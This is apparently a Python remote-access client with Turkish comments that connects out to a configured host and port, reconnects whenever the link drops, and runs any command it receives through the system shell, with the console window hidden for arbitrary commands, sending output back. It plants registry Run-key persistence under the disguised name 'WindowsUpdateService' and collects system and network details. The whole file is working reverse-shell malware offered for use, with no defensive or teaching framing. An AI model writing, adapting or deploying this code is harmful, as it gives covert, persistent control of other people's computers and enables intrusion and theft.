import socket
import subprocess
import os
import time

# ==================== AYARLAR ====================
host = "127.0.0.1"
port = 7771
# =================================================

def add_persistence():
    try:
        import winreg
        script_path = os.path.abspath(__file__)
        exe_path = sys.executable
        run_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, f'"{exe_path}" "{script_path}"')
        return True
    except:
        return False


# Başlarken persistence kontrol et ve ekle
if "WindowsUpdateService" not in subprocess.getoutput(
        'reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul'):
    if add_persistence():
        print("[+] Persistence eklendi → Artık her açılışta otomatik bağlanacak!")

# Otomatik bağlanma + reconnect
def baglan():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            print("[+] Server'a bağlandı!")
            return s
        except:
            print("[*] Server kapalı, 3 saniye sonra tekrar deniyorum...")
            time.sleep(3)

s = baglan()

# ================ ANA DÖNGÜ ================
while True:
    try:
        komut = s.recv(8192).decode("utf-8", errors="ignore").strip()
        if not komut:
            continue

        # === ÖZEL KOMUTLAR ===
        if komut.lower().startswith("msg "):
            mesaj = komut[4:].strip()
            subprocess.Popen(f'msg * "{mesaj}"', shell=True)
            s.send(f"[+] Mesaj gönderildi: {mesaj}\r\n".encode("utf-8"))

        elif komut == "computername":
            pc = os.getenv("COMPUTERNAME")
            s.send(f"[+] Bilgisayar Adı: {pc}\r\n".encode("utf-8"))

        elif komut == "exit":
            s.send("[+] Görüşürüz kral, client kapanıyor...\r\n".encode("utf-8"))
            s.close()
            break

        # === HIZLI KOMUTLAR ===
        elif komut in ["dir", "cls", "ipconfig", "whoami",   "arp -a", "getmac", "systeminfo", ]:
            proc = subprocess.Popen(komut, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding='cp1254', errors='replace')
            output = proc.stdout.read() + proc.stderr.read()
            s.send((output + "\r\n").encode("utf-8"))

        # === EXPLORER AÇMA KOMUTLARI ===
        elif komut in ["trash", "control_panel", "printers", "fonts", "godmode"]:
            shell_commands = {
                "trash": "explorer shell:RecycleBinFolder",
                "control_panel": "explorer shell:ControlPanelFolder",
                "printers": "explorer shell:PrintersFolder",
                "fonts": "explorer shell:Fonts",
                "godmode": r'explorer shell:::{ED7BA470-8E54-465E-825C-99712043E01C}'
            }
            subprocess.Popen(shell_commands[komut], shell=True)
            s.send(f"[+] {komut.upper()} açıldı!\r\n".encode("utf-8"))

        # === DİĞER TÜM KOMUTLAR ===
        else:
            proc = subprocess.Popen(komut, shell=True,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    encoding='cp1254', errors='replace',
                                    creationflags=subprocess.CREATE_NO_WINDOW)
            output = proc.stdout.read() + proc.stderr.read()
            if not output.strip():
                output = "[+] Komut çalıştı ama çıktı yok."
            s.send((output + "\r\n").encode("utf-8"))

    except (ConnectionResetError, BrokenPipeError, OSError):
        print("[-] Bağlantı koptu, yeniden bağlanıyor...")
        s.close()
        time.sleep(2)
        s = baglan()

    except Exception as e:
        try:
            s.send(f"[-] Hata: {str(e)}\r\n".encode("utf-8"))
        except:
            pass